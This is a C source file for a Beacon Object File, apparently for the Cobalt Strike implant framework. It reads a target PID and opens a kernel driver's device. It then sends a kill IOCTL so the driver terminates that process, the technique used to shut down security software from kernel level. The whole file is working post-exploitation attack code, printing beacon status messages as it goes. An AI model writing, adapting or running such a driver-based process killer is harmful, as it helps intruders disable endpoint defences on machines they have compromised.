#include "beacon.h"
#include "ntdefs.h"
#include "utils.h"

#define DEVICE_PATH L"\\\\.\\{F8284233-48F4-4680-ADDD-F8284233}"
#define IOCTL_KILL  0x22E010

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeviceIoControl(
    HANDLE, DWORD, LPVOID, DWORD,
    LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

// Manual itoa — no CRT in BOF
static void dword_to_str(DWORD val, char* buf) {
    char tmp[16] = {0};
    int  i = 0, j = 0;
    if (val == 0) { buf[0] = '0'; buf[1] = '\0'; return; }
    while (val > 0) {
        tmp[i++] = '0' + (val % 10);
        val /= 10;
    }
    for (j = 0; j < i; j++)
        buf[j] = tmp[i - j - 1];
    buf[i] = '\0';
}

// Manual strlen — no CRT in BOF
static DWORD slen(const char* s) {
    DWORD n = 0;
    while (s[n]) n++;
    return n;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    DWORD pid = (DWORD)BeaconDataInt(&parser);
    if (pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid PID\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target PID: %lu\n", pid);

    // ── 1. Open handle to driver device ──────────────────────
    HANDLE hDevice = KERNEL32$CreateFileW(
        DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CreateFileW failed: %lu (driver loaded?)\n",
            KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Device opened\n");

    // ── 2. Convert PID to ASCII string ───────────────────────
    // Driver expects PID as decimal ASCII string in the input buffer
    char pidStr[16] = {0};
    dword_to_str(pid, pidStr);

    // ── 3. Send IOCTL ─────────────────────────────────────────
    char  outBuf[16] = {0};
    DWORD bytesRet   = 0;

    BOOL ok = KERNEL32$DeviceIoControl(
        hDevice,
        IOCTL_KILL,
        pidStr,  slen(pidStr) + 1,
        outBuf,  sizeof(outBuf),
        &bytesRet,
        NULL);

    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Driver response: %s\n[+] Process %lu terminated\n",
            outBuf, pid);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] DeviceIoControl failed: %lu\n",
            KERNEL32$GetLastError());
    }

    // ── 4. Close handle ───────────────────────────────────────
    KERNEL32$CloseHandle(hDevice);
}